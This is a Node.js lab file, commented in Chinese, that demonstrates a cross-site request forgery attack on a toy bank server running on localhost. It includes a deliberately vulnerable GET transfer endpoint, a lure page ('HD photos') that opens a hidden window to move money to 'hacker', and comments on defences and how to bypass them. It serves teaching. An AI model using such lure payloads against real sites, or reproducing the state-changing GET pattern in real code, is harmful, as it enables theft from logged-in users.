const http = require('http')
const qs = require('querystring')
const URL = require('url')

// 模拟账户
const account = {
  keliq: 1000, // 受害者账户
  hacker: 0, // 攻击者账户
}

// 路由分发器
const routes = {
  'localhost:3000': (req, res) => {
    const from = req.cookies.session
    if (!from && req.path !== '/login') return res.end('请先登录')
    switch (req.path) {
      case '/login': // 登录接口
        res.setHeader('Set-Cookie', ['session=keliq; httpOnly=true;']) // 设置 httpOnly Cookie
        res.end('<h2>欢迎您，keliq！</h2>')
        break
      case '/balance': // 查询账户余额接口
        res.end(`${from}的账户余额为：${account[from]}`)
        break
      case '/transfer': // 转账接口
        const { money, to } = req.query
        account[from] -= money
        account[to] += money
        const str = `${from}向${to}转账成功，金额${money}`
        console.log(str)
        res.end(str)
        break
      default:
        res.end('404')
    }
  },
  '127.0.0.1:4000': (req, res) => {
    res.end(`
<div id="el">
  <p>5G高清美女照片，赶快<a href="javascript:transfer()">点击下载</a>吧！</p>
  <img id="img" width="300" src="http://img.zlib.cn/beauty/1.jpg" />
</div>
<script>
  function transfer() {
    open('http://localhost:3000/transfer?to=hacker&money=100', '', 'width=300,height=100,left=5000,top=5000')
    const h2 = document.createElement('h2')
    h2.innerHTML = '不该点的链接不要点，贪婪是原罪！'
    el.appendChild(h2)
  }
</script>`)
  },
}



function onRequest(req, res) {
  const { url, headers } = req // 获取 url 和 headers
  console.log(headers)
  const cookies = qs.parse(headers.cookie, '; ') // 从 headers 中解析出 cookies 对象
  const { query, pathname: path } = URL.parse(url, true) // 从 url 中解析出 query 和 path 对象
  Object.assign(req, { query, path, cookies }) // 扩展 req
  const route = routes[headers.host] // 根据 host 分发路由（策略模式）
  res.setHeader('content-type', 'text/html;charset=utf-8')
  if (route) return route(req, res)
  res.statusCode = 404 && res.end('Not Found')
}

http.createServer(onRequest).listen(3000) // 被攻击的网站
http.createServer(onRequest).listen(4000) // 攻击者的网站

/*
  攻击步骤：
  1. 受害者登录网站 http://localhost:3000/login 获取 Cookie 凭证
    1.1 受害者先查询自己的余额 http://localhost:3000/balance
  2. 攻击者诱导受害者进入第三方网站 http://127.0.0.1:4000
  3. 受害者点击 GET 类型的链接，发送跨站请求，自动转账给攻击者
    3.1 再次查询自己的余额 http://localhost:3000/balance

  防御措施：
  1. GET 接口只用于查询，不要用于任何操作行为
  2. 获取请求 referer: 'http://127.0.0.1:4000/'，设置白名单
    2.1 不是很有效，因为前端可以绕过，例如直接写：<a href="http://localhost:3000/transfer?to=hacker&money=100" rel="noreferrer">点击下载</a>
  3. 点击链接之前查看一下链接地址，不该点的千万不要点
    3.1 也不是很有效，因为第三方网站可以直接写：document.body.addEventListener('click', transfer)
*/
